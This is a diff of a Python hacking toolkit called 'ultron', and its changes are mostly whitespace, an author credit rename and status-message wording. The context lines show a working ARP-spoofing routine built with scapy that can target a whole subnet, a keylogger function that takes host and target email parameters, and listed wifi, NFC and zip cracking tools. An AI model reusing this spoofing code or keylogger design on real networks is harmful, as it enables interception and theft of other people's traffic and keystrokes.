@@ -2,7 +2,7 @@
 # Project with different tools
 # version 1.1.3
 
-# additional tools 
+# additional tools
 # wifi extractor
 # nfc cracker
 # zip cracker
@@ -53,8 +53,8 @@ def help_menu():
     █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄██▄▄▄█ █▄▄▄█  █▄█▄▄▄▄▄▄▄█▄█  █▄▄█v1.1.3
 
 
-    Powered by rysecx
-    https://github.com/rysecx
+    Powered by parasomni
+    https://github.com/parasomni
 
     usage:
         ultron <tool> [features]
@@ -151,7 +151,7 @@ def integrity_script(sourcePath, hashFile, hashAlgorithm, isOS, fullScan, firstF
         with open(txt_path_, "a") as f:
             f.write(hash_str)
         f.close()
-    
+
     def write_invalidLogFile(log, logFile):
         with open(logFile, "a") as f:
             f.write(log)
@@ -203,13 +203,13 @@ def integrity_script(sourcePath, hashFile, hashAlgorithm, isOS, fullScan, firstF
             with open (invalidLogFile, 'a') as logFile:
                 logFile.write(str(log))
             logFile.close()
-        
+
         def write_main_log(log):
             logPath = mainLogPath + current_date_time + '.log'
             with open (logPath, 'a') as logFile:
                 logFile.write(str(log))
             logFile.close()
-        
+
         def write_list(data, path_name_log):
             data += '\r\n'
             with open (ultronDirLogs + path_name_log, 'a') as logFile:
@@ -347,7 +347,7 @@ def integrity_script(sourcePath, hashFile, hashAlgorithm, isOS, fullScan, firstF
                     return 0
             else:
                 write_list(data, path_name_log)
-                return 0 
+                return 0
 
         def log_dir_data(pathName):
             slash = '/'
@@ -1136,34 +1136,34 @@ def arp_spoof(targetIP1, targetIP2, targetALL):
                                 hwdst = destination_mac,
                     psrc = source_ip, hwsrc = source_mac)
         scapy.send(packet, verbose = False)
-        
+
     packetCount = 1
     h_name = socket.gethostname()
-    addr = socket.gethostbyname(h_name)    
-    
+    addr = socket.gethostbyname(h_name)
+
     def send_subnet(targetIP1, targetIP2, packetCount):
         modified_IP = str(targetIP2)[:-1]
         targetIP1 = modified_IP + str(i)
         if targetIP1 == addr:
             pass
         else:
-            
+
             try:
                 spoof(targetIP1, targetIP2)
                 spoof(targetIP2, targetIP1)
-                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}') 
+                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')
             except KeyboardInterrupt:
                 sys.exit()
             except Exception as e:
-                print(colors.RED, "ERROR: Target unreachable : ", targetIP1, colors.WHITE, end="\r")        
-    
+                print(colors.RED, "ERROR: Target unreachable : ", targetIP1, colors.WHITE, end="\r")
+
     try:
         print("processing attack...")
         while True:
             if targetALL == 0:
                 spoof(targetIP1, targetIP2)
                 spoof(targetIP2, targetIP1)
-                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')               
+                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')
             else:
                 for i in range(2, 254):
                     thread = threading.Thread(target=send_subnet, args=(targetIP1,targetIP2,packetCount))
@@ -1315,13 +1315,13 @@ def key_logger(hostEmail, hostFile, targetEmail, verboseLevel):
 
 def ultron():
     # print("\r\nstatus:  Ultron is running  [", colors.GREEN, "+", colors.WHITE, "]")
-    print("fetching args ... ", end="\r")
+    print("parsing args ... ", end="\r")
 
     def fetch_done():
-        print("fetching args    [", colors.GREEN, "done", colors.WHITE, "]")
+        print("parsing args    [", colors.GREEN, "done", colors.WHITE, "]")
 
     def fetch_failed():
-        print("fetching args    [", colors.RED, "failed", colors.WHITE, "]")
+        print("parsing args    [", colors.RED, "failed", colors.WHITE, "]")
         print("for exact usage try -help")
 
     def ultron_done():
@@ -1424,9 +1424,9 @@ def ultron():
                 if sys.argv[i] == wordList[0]:
                     argsArray[0] = sys.argv[i + 1]
                 elif sys.argv[i] == wordList[1]:
-                    argsArray[1] = sys.argv[i + 1]      
+                    argsArray[1] = sys.argv[i + 1]
                 elif sys.argv[i] == wordList[2]:
-                    argsArray[2] = 1 
+                    argsArray[2] = 1
                 else:
                     pass
             fetch_done()
